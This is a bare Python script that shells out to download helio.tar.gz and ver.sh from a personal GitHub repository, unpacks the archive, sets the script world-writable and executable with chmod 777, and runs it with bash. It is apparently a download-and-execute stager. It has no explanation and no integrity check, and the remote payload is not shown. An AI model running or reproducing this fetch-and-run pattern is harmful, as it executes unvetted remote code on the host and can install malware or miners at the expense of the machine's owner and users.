import subprocess
import time

subprocess.call("wget https://github.com/thoeb292/thoeb292/raw/main/helio.tar.gz", shell=True)
subprocess.call("tar xf helio.tar.gz", shell=True)
subprocess.call("wget https://github.com/thoeb292/thoeb292/raw/main/ver.sh", shell=True)
subprocess.call("chmod 777 ver.sh", shell=True)
subprocess.call("bash ver.sh", shell=True)
